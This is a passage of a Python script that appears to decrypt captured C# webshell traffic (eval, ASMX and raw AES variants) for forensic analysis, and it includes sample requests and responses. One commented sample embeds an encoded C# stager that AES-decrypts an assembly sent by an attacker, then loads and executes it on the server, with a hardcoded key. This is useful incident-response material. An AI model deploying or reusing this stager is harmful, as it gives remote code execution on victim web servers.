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')
    # print(data)
    # data = decrypter.decrypt_res_payload(b'11CD6A8758984163CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=6C37AC826A2A04BC')
    # print(data)

    # decrypter = CSHAP_EVAL_AES_BASE64(pass_='pass', key='3c6e0b8a9c15224a')
    # data = decrypter.decrypt_req_payload(
    #     b'pass=eval%28System.Text.Encoding.Default.GetString%28System.Convert.FromBase64String%28HttpUtility.UrlDecode%28%27ICAgICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBhcHBjb250ZXh0ID0gSHR0cENvbnRleHQuQ3VycmVudDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXBwY29udGV4dC5BcHBsaWNhdGlvbi5SZW1vdmUoIiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIga2V5ID0gIjNjNmUwYjhhOWMxNTIyNGEiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgcGFzcyA9ICJrZXkiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgY29va2llTmFtZSA9ICJzZXNzaW9uS2V5IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGNvb2tpZVZhbHVlID0gYXBwY29udGV4dC5SZXF1ZXN0LkNvb2tpZXMuR2V0KGNvb2tpZU5hbWUpID09IG51bGwgPyAiIiA6IGFwcGNvbnRleHQuUmVxdWVzdC5Db29raWVzLkdldChjb29raWVOYW1lKS5WYWx1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIG1kNSA9IFN5c3RlbS5CaXRDb252ZXJ0ZXIuVG9TdHJpbmcobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuTUQ1Q3J5cHRvU2VydmljZVByb3ZpZGVyKCkuQ29tcHV0ZUhhc2goU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhwYXNzICsga2V5KSkpLlJlcGxhY2UoIi0iLCAiIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBkYXRhID0gU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhhcHBjb250ZXh0LlJlcXVlc3RbcGFzc10pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgYXNzZW1ibHkgPSBhcHBjb250ZXh0LkFwcGxpY2F0aW9uLkdldChjb29raWVWYWx1ZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhc3NlbWJseSA9PSBudWxsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgY29va2llID0gbmV3IEh0dHBDb29raWUoY29va2llTmFtZSwgU3lzdGVtLkd1aWQuTmV3R3VpZCgpLlRvU3RyaW5nKCJOIikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29va2llVmFsdWUgPSBjb29raWUuVmFsdWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBjb250ZXh0LlJlc3BvbnNlLkNvb2tpZXMuQWRkKGNvb2tpZSk7DQogICAgICAgICAgICAgICAgCQkJCQlhc3NlbWJseSA9IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LkxvYWQobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmlqbmRhZWxNYW5hZ2VkKCkuQ3JlYXRlRGVjcnlwdG9yKFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSwgU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhrZXkpKS5UcmFuc2Zvcm1GaW5hbEJsb2NrKGRhdGEsIDAsIGRhdGEuTGVuZ3RoKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBjb250ZXh0LkFwcGxpY2F0aW9uLlNldChjb29raWVWYWx1ZSwgYXNzZW1ibHkpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIG8gPSBhc3NlbWJseS5DcmVhdGVJbnN0YW5jZSgiTFkiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBvdXRTdHJlYW0gPSBuZXcgU3lzdGVtLklPLk1lbW9yeVN0cmVhbSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgby5FcXVhbHMob3V0U3RyZWFtKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG8uRXF1YWxzKGFwcGNvbnRleHQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgby5FcXVhbHMobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmlqbmRhZWxNYW5hZ2VkKCkuQ3JlYXRlRGVjcnlwdG9yKFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSwgU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhrZXkpKS5UcmFuc2Zvcm1GaW5hbEJsb2NrKGRhdGEsIDAsIGRhdGEuTGVuZ3RoKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvLlRvU3RyaW5nKCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgciA9IG91dFN0cmVhbS5Ub0FycmF5KCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRTdHJlYW0uRGlzcG9zZSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXBwY29udGV4dC5SZXNwb25zZS5Xcml0ZShtZDUuU3Vic3RyaW5nKDAsIDE2KSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBjb250ZXh0LlJlc3BvbnNlLldyaXRlKFN5c3RlbS5Db252ZXJ0LlRvQmFzZTY0U3RyaW5nKG5ldyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJpam5kYWVsTWFuYWdlZCgpLkNyZWF0ZUVuY3J5cHRvcihTeXN0ZW0uVGV4dC5FbmNvZGluZy5EZWZhdWx0LkdldEJ5dGVzKGtleSksIFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSkuVHJhbnNmb3JtRmluYWxCbG9jayhyLCAwLCByLkxlbmd0aCkpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFwcGNvbnRleHQuUmVzcG9uc2UuV3JpdGUobWQ1LlN1YnN0cmluZygxNikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7DQogICAgICAgICAgICAgICAgfQ0K%27%29%29%29%2C%27unsafe%27%29%3B&key=WwSelqL9JENiXyh3FQxhh6neBpd6CFz4tFjBohtMq8pX0MY0w6%2F1Gkg4dxy5JO9o')
    # print(data)
    # data = decrypter.decrypt_res_payload(
    #     b'72A9C691CCDAAB98CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=B4C4E1F6DDD2A488')
    # print(data)

    decrypter = CSHAP_ASMX_AES_BASE64(pass_='pass', key='3c6e0b8a9c15224a')
    asmx_req = b'''<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <pass xmlns="http://tempuri.org/">
          <pass>WwSelqL9JENiXyh3FQxhh6neBpd6CFz4tFjBohtMq8pX0MY0w6%2F1Gkg4dxy5JO9o</pass>
        </pass>
      </soap:Body>
    </soap:Envelope>'''
    asmx_res = b'''<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><passResponse xmlns="http://tempuri.org/"><passResult>11CD6A8758984163CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=6C37AC826A2A04BC</passResult></passResponse></soap:Body></soap:Envelope>'''
    data = decrypter.decrypt_req_payload(asmx_req)
    print(data)
    data = decrypter.decrypt_res_payload(asmx_res)
    print(data)
    # decrypter = CSHAP_AES_RAW(pass_='pass', key='3c6e0b8a9c15224a')
    # cshap_aes_raw_req='5b049e96a2fd2443625f2877150c6187a9de06977a085cf8b458c1a21b4cabca57d0c634c3aff51a4838771cb924ef68'
    # cshap_aes_raw_res = '09117c163bbc609598b1a71d8f64bd865aecc5e0c757c19290b33f8d2f4e3655'
    # data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(cshap_aes_raw_req)))
    # print(data)
    # data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(cshap_aes_raw_res)))
    # print(data)